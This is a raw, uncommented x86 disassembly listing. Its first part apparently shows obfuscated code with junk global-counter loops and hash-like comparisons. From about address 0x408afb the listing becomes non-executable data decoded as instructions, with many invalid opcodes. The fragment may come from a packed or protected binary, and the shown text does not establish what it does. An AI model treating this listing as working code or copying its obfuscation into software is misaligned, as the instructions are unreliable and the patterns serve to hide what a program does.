  40892e:	mov    DWORD PTR [ebp-0x24],eax
  408931:	adc    eax,ecx
  408933:	mov    eax,DWORD PTR [ebp-0x14]
  408936:	and    DWORD PTR ds:0x426f2d,0x0
  408940:	jmp    0x408952
  408945:	mov    ecx,DWORD PTR ds:0x426f2d
  40894b:	inc    ecx
  40894c:	mov    DWORD PTR ds:0x426f2d,ecx
  408952:	cmp    DWORD PTR ds:0x426f2d,0x12
  408959:	jae    0x4089a4
  40895f:	cmp    DWORD PTR ds:0x426f2d,0x5
  408966:	jbe    0x4089a4
  40896c:	jmp    0x408985
  408971:	push   0x426099
  408976:	push   DWORD PTR [ebp-0x28]
  408979:	push   DWORD PTR [ebp-0x1c]
  40897c:	push   DWORD PTR [ebp-0x10]
  40897f:	call   DWORD PTR ds:0x42fa24
  408985:	cmp    DWORD PTR ds:0x426f2d,0x4
  40898c:	jne    0x40899f
  408992:	mov    ecx,DWORD PTR ds:0x426f2d
  408998:	inc    ecx
  408999:	mov    DWORD PTR ds:0x426f2d,ecx
  40899f:	jmp    0x408945
  4089a4:	mov    ecx,DWORD PTR [ebp+0x8]
  4089a7:	add    ecx,DWORD PTR [eax+0x20]
  4089aa:	and    DWORD PTR ds:0x426efd,0x4f65
  4089b4:	mov    DWORD PTR [ebp-0x2c],ecx
  4089b7:	mov    eax,DWORD PTR [ebp-0x14]
  4089ba:	dec    DWORD PTR ds:0x426ed9
  4089c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4089c3:	and    DWORD PTR ds:0x426ef1,0x27b6
  4089cd:	add    ecx,DWORD PTR [eax+0x24]
  4089d0:	and    DWORD PTR ds:0x426f11,0x472e
  4089da:	mov    DWORD PTR [ebp-0x34],ecx
  4089dd:	mov    DWORD PTR ds:0x426f05,0x15
  4089e7:	cmp    DWORD PTR ds:0x426f05,0x0
  4089ee:	je     0x408a3a
  4089f4:	cmp    DWORD PTR ds:0x426f05,0x6
  4089fb:	jle    0x408a3a
  408a01:	jmp    0x408a0f
  408a06:	push   DWORD PTR [ebp-0x28]
  408a09:	call   DWORD PTR ds:0x42fa28
  408a0f:	cmp    DWORD PTR ds:0x426f05,0x7
  408a16:	jne    0x408a2a
  408a1c:	xor    eax,eax
  408a1e:	xor    eax,DWORD PTR ds:0x426f05
  408a24:	dec    eax
  408a25:	mov    ds:0x426f05,eax
  408a2a:	mov    eax,ds:0x426f05
  408a2f:	dec    eax
  408a30:	mov    ds:0x426f05,eax
  408a35:	jmp    0x4089e7
  408a3a:	mov    eax,DWORD PTR [ebp-0x14]
  408a3d:	or     ecx,0x6017
  408a43:	mov    ecx,DWORD PTR [ebp+0x8]
  408a46:	sbb    DWORD PTR ds:0x426e9d,0x426f29
  408a50:	add    ecx,DWORD PTR [eax+0x1c]
  408a53:	mov    DWORD PTR ds:0x426e89,0x71b1
  408a5d:	mov    DWORD PTR [ebp-0x14],ecx
  408a60:	jmp    0x408ae1
  408a65:	mov    ecx,DWORD PTR ds:0x426ee1
  408a6b:	or     DWORD PTR ds:0x426f29,ecx
  408a71:	mov    eax,DWORD PTR [ebp-0x2c]
  408a74:	mov    ecx,DWORD PTR [ebp+0x8]
  408a77:	add    ecx,DWORD PTR [eax+ebx*4]
  408a7a:	add    eax,DWORD PTR ds:0x426f11
  408a80:	mov    DWORD PTR [ebp-0x28],ecx
  408a83:	mov    eax,DWORD PTR [ebp-0x4]
  408a86:	mov    ecx,DWORD PTR [ebp-0x28]
  408a89:	xor    eax,esi
  408a8b:	add    eax,edi
  408a8d:	mov    DWORD PTR ds:0x426eb5,0x5328
  408a97:	cmp    ecx,eax
  408a99:	je     0x408ae1
  408a9f:	mov    DWORD PTR ds:0x426f0d,0x30c
  408aa9:	jmp    0x408ad2
  408aae:	mov    eax,DWORD PTR [ebp-0x4]
  408ab1:	mov    ecx,DWORD PTR [ebp-0x8]
  408ab4:	xor    eax,esi
  408ab6:	add    eax,edi
  408ab8:	cmp    ecx,eax
  408aba:	mov    eax,DWORD PTR [ebp-0x4]
  408abd:	je     0x40aed1
  408ac3:	mov    ecx,DWORD PTR [ebp-0x30]
  408ac6:	xor    eax,esi
  408ac8:	add    eax,edi
  408aca:	cmp    ecx,eax
  408acc:	je     0x40aeda
  408ad2:	lea    eax,[ebp-0x8]
  408ad5:	push   eax
  408ad6:	push   DWORD PTR [ebp-0x28]
  408ad9:	push   DWORD PTR [ebp+0xc]
  408adc:	call   0x411c13
  408ae1:	mov    eax,DWORD PTR [ebp-0x4]
  408ae4:	mov    ecx,DWORD PTR [ebp-0x8]
  408ae7:	xor    eax,esi
  408ae9:	add    eax,edi
  408aeb:	cmp    ecx,eax
  408aed:	je     0x40aebd
  408af3:	mov    eax,DWORD PTR [ebp-0x34]
  408af6:	jmp    0x40aeab
  408afb:	cwde   
  408afc:	mov    esi,0x78f950e9
  408b01:	cmp    BYTE PTR [esi+0x12],al
  408b04:	mov    ds:0x4d9029ff,eax
  408b09:	cmc    
  408b0a:	pop    ss
  408b0b:	jmp    0x7b9c:0x137b7be5
  408b12:	jnp    0x408b77
  408b14:	sbb    cl,bh
  408b16:	rcl    BYTE PTR [ecx],cl
  408b18:	call   0x615d:0x9a79d0b3
  408b1f:	jmp    0x408b46
  408b21:	aas    
  408b22:	pop    eax
  408b23:	test   eax,0xa101b880
  408b28:	clc    
  408b29:	jle    0x408b7c
  408b2b:	lods   al,BYTE PTR ds:[esi]
  408b2c:	lds    ecx,FWORD PTR [esi]
  408b2e:	sub    DWORD PTR ds:0x50e54f5d,ebp
  408b34:	xchg   ebx,eax
  408b35:	(bad)  
  408b36:	sar    BYTE PTR [ebp+eax*8-0x6c27888d],1
  408b3d:	mov    bh,0xf2
  408b3f:	lahf   
  408b40:	fnstsw WORD PTR [ecx+0x78]
  408b43:	push   ds
  408b44:	sbb    al,0x1e
  408b46:	out    0xe4,al
  408b48:	or     ecx,DWORD PTR [ecx+0x4c]
  408b4b:	ja     0x408b31
  408b4d:	(bad)  
  408b4e:	(bad)  ds:0x3f4b5b52
  408b54:	add    DWORD PTR [eax-0x49c97976],ebp
  408b5a:	dec    esi
  408b5b:	mov    edi,ebp
  408b5d:	inc    eax
  408b5e:	lock lods al,BYTE PTR ds:[esi]
  408b60:	xor    ecx,DWORD PTR [ecx]
  408b62:	(bad)  
  408b63:	sub    al,0x70
  408b65:	cld    
  408b66:	dec    eax
  408b67:	imul   ecx,DWORD PTR [esi-0xcb7c871],0xffffffe1
  408b6e:	push   edx
  408b6f:	js     0x408b42
  408b71:	adc    cl,dl
  408b73:	and    BYTE PTR [esi+0x4e],cl
  408b76:	sub    ebp,DWORD PTR [eax]
  408b78:	inc    esp
  408b79:	pop    ecx
  408b7a:	pop    ecx
  408b7b:	adc    eax,0x17e64d41
  408b80:	push   cs
  408b81:	shl    BYTE PTR [edi+0x32],1
  408b84:	xchg   esp,eax
  408b85:	mov    ebp,0xdc7ae54f
  408b8a:	xor    al,0x26
  408b8c:	hlt    
  408b8d:	lods   eax,DWORD PTR ds:[esi]
  408b8e:	cmc    
  408b8f:	jo     0x408c05
  408b91:	sbb    edi,ebx
  408b93:	ds pop ss
  408b95:	aam    0x1c
  408b97:	test   DWORD PTR [ecx-0x2677d0fc],ebp
  408b9d:	dec    edx
  408b9e:	xchg   edx,eax
  408b9f:	shl    eax,0x63
  408ba2:	dec    esp
  408ba3:	stos   DWORD PTR es:[edi],eax
  408ba4:	sbb    ah,BYTE PTR [edi+ebp*2-0x74]
  408ba8:	popa   
  408ba9:	and    eax,0x8bde6a19
  408bae:	test   eax,0x32456d8b
  408bb3:	cmp    DWORD PTR [esi-0x44],edx
  408bb6:	js     0x408bfb
  408bb8:	xchg   edx,eax
  408bb9:	test   DWORD PTR [ecx],esp
  408bbb:	jp     0x408b5f
  408bbd:	jo     0x408c2c
  408bbf:	lea    edx,[esi]
  408bc1:	(bad)  [edi+0x7698dfe]
  408bc7:	sbb    al,0x4e
  408bc9:	repnz test eax,0x213b9cfd
  408bcf:	cld    
  408bd0:	arpl   ax,ax
  408bd2:	sub    DWORD PTR [ecx+edi*1-0x27],ebp
  408bd6:	test   eax,0xf294a228
  408bdb:	imul   edx,DWORD PTR [ebx],0x55
  408bde:	std    
  408bdf:	mov    ebx,0xbe98bcac
  408be4:	mov    ds:0xcdc61d93,eax
  408be9:	sbb    eax,esp
  408beb:	rol    DWORD PTR [ecx-0x3c],cl
  408bee:	sbb    eax,0x2ba3434e
  408bf3:	test   ebx,ebp
  408bf5:	aad    0xdd
  408bf7:	ds es xchg ebx,eax
  408bfa:	jg     0x408bfe
  408bfc:	ins    BYTE PTR es:[edi],dx
  408bfd:	aas    
  408bfe:	xchg   ebx,eax
  408bff:	jns    0x408c18
  408c01:	adc    ecx,DWORD PTR [eax]
  408c03:	fdivr  QWORD PTR [eax-0xb]
  408c06:	mov    eax,ds:0xfd85da71
  408c0b:	push   ebx
  408c0c:	mov    ah,0xc0
  408c0e:	cmp    BYTE PTR [esi-0xc],dl
  408c11:	push   esi
  408c12:	push   ebp
  408c13:	cmp    bh,BYTE PTR [ecx+0x48]
  408c16:	lods   eax,DWORD PTR ds:[esi]
  408c17:	int3   
  408c18:	sub    al,dh
  408c1a:	lock arpl WORD PTR ds:0xf8c701d4,dx
  408c21:	dec    esi
  408c22:	loope  0x408bdb
  408c24:	adc    ebp,DWORD PTR [eax]
  408c26:	std    
  408c27:	popf   
  408c28:	mov    esp,0x3205aa4f
  408c2d:	cmp    DWORD PTR [edi+0x4a0e288b],esi
  408c33:	ror    DWORD PTR [edi+0x69],1
  408c36:	mov    cl,0x83
  408c38:	test   BYTE PTR [ebx+0x53b82cc9],dl
  408c3e:	push   cs
  408c3f:	scas   al,BYTE PTR es:[edi]
  408c40:	clc    
  408c41:	fbld   TBYTE PTR [ecx+0x2666d240]
  408c47:	ins    DWORD PTR es:[edi],dx
  408c48:	add    ch,BYTE PTR [edi+0x4b830188]
  408c4e:	cmp    eax,0x8afb38ec
  408c53:	call   0xb707581f
  408c58:	sahf   
  408c59:	mov    esi,0x893883e7
  408c5e:	in     eax,0x9a
  408c60:	addr16 pop edx
  408c62:	jno    0x408c56
  408c64:	rcl    BYTE PTR [ebx+0x6b],cl
  408c67:	icebp  
  408c68:	or     BYTE PTR [ecx-0x57],bh
  408c6b:	fimul  WORD PTR [bp+di-0x59dd]
  408c70:	mov    ch,0xdb
  408c72:	out    dx,al
  408c73:	dec    ebx
  408c74:	or     ecx,esp
  408c76:	bound  edx,QWORD PTR [eax+0x4d0ef021]
  408c7c:	mul    DWORD PTR [esi-0xd3aa3d7]
  408c82:	and    BYTE PTR [eax-0x22],cl
  408c85:	jbe    0x408ca2
  408c87:	xchg   ecx,eax
  408c88:	ins    DWORD PTR es:[edi],dx
  408c89:	ins    DWORD PTR es:[edi],dx
  408c8a:	jp     0x408c88
  408c8c:	sar    DWORD PTR [edx+0x79],cl
  408c8f:	fisttp DWORD PTR [ecx]
  408c91:	add    al,0xf6
  408c93:	push   ds
  408c94:	dec    DWORD PTR [ebx-0x10]
  408c97:	jg     0x408c90
  408c99:	sub    ch,BYTE PTR [ebp+0x3d]
  408c9c:	test   BYTE PTR [esi],bh
  408c9e:	cdq    
  408c9f:	mov    ecx,0x3402413d
  408ca4:	fist   DWORD PTR ds:0xad2c24bd
  408caa:	cmp    ecx,DWORD PTR [ebx+0x63]
  408cad:	and    BYTE PTR [edi+0x7c27ade0],ah
  408cb3:	int3   
  408cb4:	(bad)  
  408cb5:	shr    BYTE PTR [esp+ecx*8],1
  408cb8:	xchg   ebx,eax
  408cb9:	inc    esi
  408cba:	mov    esi,0xbc00f191
  408cbf:	or     DWORD PTR [ebx-0x40],ecx
  408cc2:	cmp    BYTE PTR [esi+0x7b],0xd
  408cc6:	inc    esi
  408cc7:	adc    al,0xf3
  408cc9:	xchg   edi,eax
  408cca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ccb:	(bad)  
  408ccc:	push   edi
  408ccd:	cmp    eax,0x4509d7d7
  408cd2:	adc    DWORD PTR [ebx+0xa],ecx
  408cd5:	inc    ebp
  408cd6:	mov    edi,0xbb3bbc7e
  408cdb:	sub    eax,edx
  408cdd:	call   0xa2ea5913
  408ce2:	das    
  408ce3:	mov    ebx,0xfadffcd4
  408ce8:	shr    BYTE PTR [esi+0x133450c1],0x19
  408cef:	sbb    eax,DWORD PTR [ecx]
  408cf1:	hlt    
  408cf2:	add    al,0xdd
  408cf4:	add    eax,0x3c9a39b7
  408cf9:	aaa    
  408cfa:	dec    esp
  408cfb:	pop    ebx
  408cfc:	inc    edi
  408cfd:	ficomp DWORD PTR [esi+eax*2-0x5ddf1c94]
  408d04:	ins    BYTE PTR es:[edi],dx
  408d05:	mov    esi,0xddcf5b3e
  408d0a:	adc    dl,BYTE PTR [esi]
  408d0c:	add    BYTE PTR [esi+0xb],al
  408d0f:	or     al,0x7
  408d11:	shl    eax,0xe0
  408d14:	leave  
  408d15:	cdq    
  408d16:	mul    BYTE PTR ds:0x7b582ee1
  408d1c:	dec    ecx
  408d1d:	and    esp,edi
  408d1f:	imul   ebx,DWORD PTR [eax*8-0x7b3aa90a],0x898d85a8
  408d2a:	push   ecx
  408d2b:	pop    DWORD PTR [edi-0x1f4df5fd]
  408d31:	outs   dx,DWORD PTR ds:[esi]
  408d32:	out    0x61,eax
  408d34:	lods   eax,DWORD PTR ds:[esi]
  408d35:	xor    al,0x82
  408d37:	js     0x408d61
  408d39:	aad    0xc8
  408d3b:	das    
  408d3c:	lahf   
  408d3d:	jl     0x408d27
  408d3f:	mov    eax,0x484a25b0
  408d44:	pop    ds
  408d45:	mov    WORD PTR [eax],fs
  408d47:	mov    dl,0x6f
  408d49:	loopne 0x408d8e
  408d4b:	frstor ss:[edi+0x76]
  408d4f:	xor    BYTE PTR [ebx-0x5bcb3428],al
  408d55:	fwait
  408d56:	mov    ebp,edx
  408d58:	outs   dx,DWORD PTR ds:[esi]
  408d59:	icebp  
  408d5a:	adc    bh,0x96
  408d5d:	add    BYTE PTR [eax+esi*1],al
  408d60:	mov    eax,0x18478a3f
  408d65:	pop    edx
  408d66:	aaa    
  408d67:	or     esi,DWORD PTR [edx+0x2e711907]
  408d6d:	nop
  408d6e:	jecxz  0x408d96
  408d70:	or     eax,DWORD PTR [edi]
  408d72:	fistp  WORD PTR fs:[edx+eax*1+0x2b1badb]
  408d7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d7b:	push   edi
  408d7c:	sti    
  408d7d:	jae    0x408dd3
  408d7f:	cmp    BYTE PTR [ebp-0x5716deb2],ch
  408d85:	adc    eax,ebx
  408d87:	and    DWORD PTR [ecx-0x54],eax
  408d8a:	sub    ah,ch
  408d8c:	push   0xffffffcd
  408d8e:	lods   eax,DWORD PTR ds:[esi]
  408d8f:	inc    esi
  408d90:	mov    ds:0x43cc4ce1,al
  408d95:	aaa    
  408d96:	cmc    
  408d97:	add    dh,BYTE PTR [esi+0x51]
  408d9a:	icebp  
  408d9b:	mov    eax,ds:0xfe6e9948
  408da0:	lahf   
  408da1:	cmp    eax,DWORD PTR [ebx-0x4c]
  408da4:	sti    
  408da5:	cmc    
  408da6:	pop    ecx
  408da7:	mov    BYTE PTR [ecx+esi*8-0x55],al
  408dab:	xchg   DWORD PTR [esi+0x38c9f34b],ebp
  408db1:	mov    edi,0xc129484b
  408db6:	iret   
  408db7:	jmp    0x408d80
  408db9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408dba:	fild   DWORD PTR [edx-0x75937da1]
  408dc0:	lahf   
  408dc1:	std    
  408dc2:	sub    al,0x7
  408dc4:	or     eax,0x56d61968
  408dc9:	add    eax,0xabe1551f
  408dce:	rcr    ebp,cl
  408dd0:	test   eax,0x6655d1dd
  408dd5:	or     BYTE PTR [edi-0x48abf8f6],dh
  408ddb:	(bad)  
  408ddc:	loope  0x408d88
  408dde:	and    bh,0x3d
  408de1:	adc    BYTE PTR [edi+0x32],ah
  408de4:	cli    
  408de5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408de6:	pop    esi
  408de7:	mov    esi,0x4e62397d
  408dec:	pop    edx
  408ded:	mov    bh,0x9f
  408def:	adc    al,0x34
  408df1:	les    edi,FWORD PTR [edi]
  408df3:	mov    ah,0x42
  408df5:	sub    al,0x61
  408df7:	pop    ebx
  408df8:	sub    DWORD PTR [esi+ecx*1+0x3a],ebx
  408dfc:	enter  0x5447,0xea
  408e00:	stos   BYTE PTR es:[edi],al
  408e01:	ret    0x7fdc
  408e04:	sbb    eax,0x80f8ab5a
  408e09:	stc    
  408e0a:	inc    edi
  408e0b:	pop    es
  408e0c:	mov    BYTE PTR [ecx],cl
  408e0e:	mov    gs,WORD PTR [ebx+0x57b85415]
  408e14:	aaa    
  408e15:	iret   
  408e16:	test   DWORD PTR [edx-0xf],0x7f63660e
  408e1d:	in     al,0xf8
  408e1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e20:	shl    eax,cl
  408e22:	inc    edx
  408e23:	mov    al,0xba
  408e25:	call   0x69d:0xdbe2e584
  408e2c:	adc    BYTE PTR ds:0xe635765f,bh
  408e32:	addr16 (bad) 
  408e34:	retf   0xe6fa
  408e37:	dec    esp
  408e38:	popf   
  408e39:	jae    0x408ea8
  408e3b:	add    DWORD PTR [ebp+ebp*8+0x2af31864],edi
  408e42:	push   ebp
  408e43:	pop    ecx
  408e44:	leave  
  408e45:	add    dl,0x12
  408e48:	and    al,0x76
  408e4a:	ret    
  408e4b:	push   ebx
  408e4c:	fwait
  408e4d:	xor    eax,0xd4094059
  408e52:	rcl    DWORD PTR [ebx-0x1e],cl
  408e55:	dec    eax
  408e56:	inc    edx
  408e57:	add    dl,BYTE PTR ds:0xada7683e
  408e5d:	les    edi,FWORD PTR [ecx]
  408e5f:	fimul  WORD PTR [ecx]
  408e61:	pop    edx
  408e62:	add    al,0xe9
  408e64:	xlat   BYTE PTR ds:[ebx]
  408e65:	sbb    BYTE PTR [ecx+eax*1+0xe233f67],ah
  408e6c:	mov    ebp,0x948e3c5d
  408e71:	fwait
  408e72:	cli    
  408e73:	daa    
  408e74:	xchg   edx,eax
  408e75:	xor    al,0x3f
  408e77:	icebp  
  408e78:	retf   0xb9c7
  408e7b:	sbb    DWORD PTR [esi+edi*2],ebx
  408e7e:	jb     0x408e5f
  408e80:	push   ss
  408e81:	(bad)  
  408e82:	sbb    bl,BYTE PTR [eax+0x34]
  408e85:	xchg   ebp,eax
  408e86:	in     al,0x9e
  408e88:	add    al,0x64
  408e8a:	mov    bh,0x64
  408e8c:	adc    BYTE PTR [edx-0x59],bl
  408e8f:	push   eax
  408e90:	sbb    eax,ebx
  408e92:	add    DWORD PTR [eax],edx
  408e94:	inc    edi
  408e95:	dec    edx
  408e96:	and    ebx,0x4e37fcd1
  408e9c:	adc    bh,bh
  408e9e:	cli    
  408e9f:	(bad)  
  408ea0:	iret   
  408ea1:	pop    esi
  408ea2:	test   eax,0x3c9532d8
  408ea7:	(bad)  
  408ea8:	adc    edx,DWORD PTR [edx]
  408eaa:	lahf   
  408eab:	jmp    0xf70c:0x61771aa3
  408eb2:	push   eax
  408eb3:	dec    ecx
  408eb4:	fs push cs
  408eb6:	mov    dl,0x8b
  408eb8:	sbb    BYTE PTR [edi],dh
  408eba:	pop    ebp
  408ebb:	test   DWORD PTR [eax+0x46317cbd],esp
  408ec1:	mov    al,0xa6
  408ec3:	outs   dx,BYTE PTR ds:[esi]
  408ec4:	daa    
  408ec5:	pushf  
  408ec6:	imul   edx,esp,0x2f93d20c
  408ecc:	jmp    0x3d34:0xa79ff5ce
  408ed3:	outs   dx,DWORD PTR ds:[esi]
  408ed4:	add    eax,0x6d008d03
  408ed9:	js     0x408f49
  408edb:	mov    edx,0xe10b6396
  408ee0:	mov    ?,WORD PTR [esi+ecx*1+0x6b2f100]
  408ee7:	lods   eax,DWORD PTR ds:[esi]
  408ee8:	mov    ds:0x6a232418,al
  408eed:	in     al,0xb1
  408eef:	push   ebx
  408ef0:	mov    esi,0x2281bbfd
  408ef5:	and    al,dh
  408ef7:	jae    0x408ed4
  408ef9:	outs   dx,DWORD PTR ds:[esi]
  408efa:	and    edx,DWORD PTR [esi+ecx*2]
  408efd:	sar    DWORD PTR [ebx+0x719de3e3],0x37
  408f04:	dec    ebp
  408f05:	std    
  408f06:	mov    esi,0x1beeaac
  408f0b:	jo     0x408f6a
  408f0d:	loopne 0x408f37
  408f0f:	or     eax,0x45748de0
  408f14:	xchg   BYTE PTR [edi-0x42],dl
  408f17:	dec    ebp
  408f18:	vhsubps ymm1,ymm0,YMMWORD PTR [esp+ecx*1]
  408f1d:	ds adc eax,0xc51864e6
  408f23:	xor    dh,0xc5
  408f26:	loope  0x408efc
  408f28:	jecxz  0x408ee0
  408f2a:	xchg   DWORD PTR [edi],ebx
  408f2c:	cmp    BYTE PTR [edi+0x7dce285c],ah
  408f32:	cmp    DWORD PTR [ebx*1-0x1e32b3f2],ebp
  408f39:	dec    ebp
  408f3a:	pop    ebx
  408f3b:	or     esp,edi
  408f3d:	ins    BYTE PTR es:[edi],dx
  408f3e:	add    eax,eax
  408f40:	fnstsw WORD PTR [esi+edi*2]
  408f43:	push   es
  408f44:	test   al,0x54
  408f46:	push   0xffffffd9
  408f48:	or     esi,DWORD PTR [ebp+0x2095b95c]
  408f4e:	mov    edi,0xfad351a2
  408f53:	test   BYTE PTR [esi],al
  408f55:	mov    ah,0x53
  408f57:	ficom  WORD PTR [eax-0x5660cb93]
  408f5d:	popa   
  408f5e:	inc    ebx
  408f5f:	fimul  WORD PTR [edx]
  408f61:	(bad)  
  408f62:	ds call 0xde1e59fd
  408f68:	sbb    al,0xff
  408f6a:	ja     0x408f5f
  408f6c:	sbb    cl,0x47
  408f6f:	and    DWORD PTR [edx],0x18c54f86
  408f75:	add    al,0xba
  408f77:	pop    ebp
  408f78:	div    BYTE PTR [edx]
  408f7a:	xchg   esp,eax
  408f7b:	ds ret 
  408f7d:	stos   DWORD PTR es:[edi],eax
  408f7e:	jo     0x408fa7
  408f80:	or     al,0x9d
  408f82:	push   ebp
  408f83:	out    dx,eax
  408f84:	cmp    al,0x8e
  408f86:	stc    
  408f87:	xchg   ch,bl
  408f89:	push   eax
  408f8a:	sub    esi,edi
  408f8c:	call   0x6d2d5bbc
  408f91:	bnd ja 0x408f5e
  408f94:	std    
  408f95:	mov    al,bl
  408f97:	idiv   DWORD PTR [ebx+esi*2+0x442980df]
  408f9e:	mov    ds:0xb180418c,al
  408fa3:	or     eax,0x662daa6f
  408fa8:	fmul   QWORD PTR [ebx]
  408faa:	stos   BYTE PTR es:[edi],al
  408fab:	push   esp
  408fac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408fad:	pop    esi
  408faf:	mov    cl,0x81
  408fb1:	test   BYTE PTR [ecx],bh
  408fb3:	push   0x27
  408fb5:	mov    WORD PTR [edi],ss
  408fb7:	mov    ds:0x1eeee56d,eax
  408fbc:	add    eax,0x5bfbf4d0
  408fc1:	push   esp
  408fc2:	dec    edx
  408fc3:	ret    0x7290
  408fc6:	dec    edx
  408fc7:	jb     0x408fde
  408fc9:	inc    esp
  408fca:	sbb    eax,0x5f523ab0
  408fcf:	xchg   esp,eax
  408fd0:	lahf   
  408fd1:	sbb    ebp,ecx
  408fd3:	sub    al,0xfd
  408fd5:	push   edi
  408fd6:	cwde   
  408fd7:	loope  0x409053
  408fd9:	xchg   ecx,eax
  408fda:	cmp    bl,bh
  408fdc:	xchg   ecx,eax
  408fdd:	xchg   ebx,eax
  408fde:	icebp  
  408fdf:	bound  ecx,QWORD PTR [eax*2-0x7a39b7eb]
  408fe6:	fwait
  408fe7:	jb     0x408fde
  408fe9:	push   edx
  408fea:	push   ebp
  408feb:	movd   mm7,DWORD PTR [ecx+0x34]
  408fef:	push   eax
  408ff0:	pop    eax
  408ff1:	lods   al,BYTE PTR ds:[esi]
  408ff2:	jle    0x409015
  408ff4:	(bad)  [esi+0x485a70cb]
  408ffa:	retf   
  408ffb:	stos   BYTE PTR es:[edi],al
  408ffc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ffd:	xchg   ebx,eax
  408ffe:	mov    cl,0xa3
  409000:	xchg   ecx,eax
  409001:	popa   
  409002:	call   0x800737a4
  409007:	pop    ss
  409008:	inc    eax
  409009:	paddb  mm3,QWORD PTR [eax]
  40900c:	retf   0x827d
  40900f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409010:	stos   DWORD PTR es:[edi],eax
  409011:	xor    DWORD PTR [ecx+ebp*4+0x5604bc0b],ecx
  409018:	int    0x84
  40901a:	jmp    0xdc1d:0x360422fc
  409021:	hlt    
  409022:	in     al,0xf5
  409024:	gs pop ecx
  409026:	pop    edx
  409027:	cmp    al,BYTE PTR [ebx+0x7a]
  40902a:	nop
  40902b:	shr    ah,cl
  40902d:	lds    ebx,FWORD PTR [edx+0x62e4d9a8]
  409033:	inc    ecx
  409034:	test   eax,0x8994d627
  409039:	add    cl,BYTE PTR [ecx+eax*4+0x79ea4d80]
  409040:	push   ebx
  409041:	repz or esp,DWORD PTR [eax+0x29e71235]
  409048:	scas   al,BYTE PTR es:[edi]
  409049:	scas   al,BYTE PTR es:[edi]
  40904a:	out    0x8c,al
  40904c:	cdq    
  40904d:	popf   
  40904e:	shr    ebx,1
  409050:	xor    DWORD PTR [eax-0x2b],ebx
  409053:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409054:	pop    eax
  409055:	imul   ebp,DWORD PTR [edx-0x317317aa],0x719d9736
  40905f:	or     eax,0x63ff5ca2
  409064:	call   0x26f8:0xe5a06e25
  40906b:	dec    DWORD PTR [ecx-0x61]
  40906e:	jno    0x408ffe
  409070:	pop    ebp
  409071:	out    0x17,eax
  409073:	sbb    BYTE PTR [ebx+esi*1],bh
  409076:	jmp    0xe24cd6cd
  40907b:	in     al,dx
  40907c:	stos   BYTE PTR es:[edi],al
  40907d:	das    
  40907e:	xchg   esp,eax
  40907f:	ins    BYTE PTR es:[edi],dx
  409080:	add    ebp,DWORD PTR ds:0x46642f34
  409086:	cmp    eax,0x3145ff73
  40908b:	addr16 xor al,0x4b
  40908e:	or     ecx,DWORD PTR [edx+eax*2-0x3412fb05]
  409095:	pop    ecx
  409096:	inc    edi
  409097:	ret    
  409098:	scas   al,BYTE PTR es:[edi]
  409099:	push   es
  40909a:	add    eax,DWORD PTR [ecx+0x54]
  40909d:	cmp    eax,0x2e59a7b2
  4090a2:	js     0x409063
  4090a4:	inc    edx
  4090a5:	push   edx
  4090a6:	inc    ebp
  4090a7:	sub    dh,BYTE PTR [esp+esi*2]
  4090aa:	aad    0xc2
  4090ac:	pusha  
  4090ad:	dec    esi
  4090ae:	mov    ebp,0xaeeff8cb
  4090b3:	xchg   ebx,eax
  4090b4:	aas    
  4090b5:	mov    bl,0x6c
  4090b7:	mov    DWORD PTR [edi],esp
  4090b9:	jge    0x409065
  4090bb:	mov    esi,ss
  4090bd:	sbb    eax,0xa9d08a05
  4090c2:	push   ecx
  4090c3:	out    dx,eax
  4090c4:	das    
  4090c5:	pop    ebp
  4090c6:	call   0x9efe073
  4090cb:	dec    ebp
  4090cc:	add    eax,0x46f8a9ad
  4090d1:	data16 aad 0x4c
  4090d4:	xchg   esi,eax
  4090d5:	sub    BYTE PTR [edx+eiz*1-0x9],cl
  4090d9:	xchg   ecx,eax
  4090da:	cmp    eax,0x92beb35b
  4090df:	xchg   ebp,eax
  4090e0:	xchg   ebx,eax
  4090e1:	sti    
  4090e2:	call   FWORD PTR [ebx-0x28]
  4090e5:	jecxz  0x4090c8
  4090e7:	das    
  4090e8:	jb     0x40908f
  4090ea:	les    esp,FWORD PTR [ebp+0x2361e0fa]
  4090f0:	das    
  4090f1:	xchg   ebp,eax
  4090f2:	inc    edi
  4090f3:	sub    al,BYTE PTR [edi+ebp*4-0x637bff5c]
  4090fa:	pop    ebp
  4090fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090fc:	jge    0x4090bf
  4090fe:	ja     0x40910f
  409100:	cmp    ah,BYTE PTR [ecx+eax*8]
  409103:	inc    esi
  409104:	jbe    0x409164
  409106:	pop    es
  409107:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409108:	or     eax,0x9b7994f
  40910d:	adc    cl,ch
  40910f:	fimul  DWORD PTR [esi+eiz*2]
  409112:	neg    DWORD PTR [ebp-0x7f286b80]
  409118:	xchg   BYTE PTR [esi+esi*4-0x7b],bh
  40911c:	adc    eax,eax
  40911e:	loop   0x409184
  409120:	sti    
  409121:	int3   
  409122:	dec    esp
  409123:	mov    dh,0x44
  409125:	fcomp  DWORD PTR [edx+edx*1+0x34]
  409129:	jecxz  0x409143
  40912b:	adc    ebp,eax
  40912d:	xor    al,0x24
  40912f:	mov    ecx,0xb7b2b176
  409134:	cli    
  409135:	sbb    DWORD PTR [eax+eiz*2-0x59],esp
  409139:	mov    bl,0x8f
  40913b:	je     0x4090d1
  40913d:	ror    DWORD PTR [ebx+0x4e],cl
  409140:	pop    ss
  409141:	sub    eax,0x4c06a47f
  409146:	jp     0x4090d1
  409148:	add    eax,0x9fd489ae
  40914d:	mov    ebx,0x32c2f0cf
  409152:	lods   eax,DWORD PTR ds:[esi]
  409153:	dec    esi
  409154:	adc    cl,BYTE PTR [edi+edx*2+0x6c]
  409158:	loope  0x40912a
  40915a:	in     al,0xf3
  40915c:	or     al,bl
  40915e:	add    BYTE PTR [edx],bh
  409160:	mov    bl,0x8a
  409162:	jmp    0x456b:0x207ccca
  409169:	bound  ebp,QWORD PTR [edi+0x4dc1ee0b]
  40916f:	fstp   st(7)
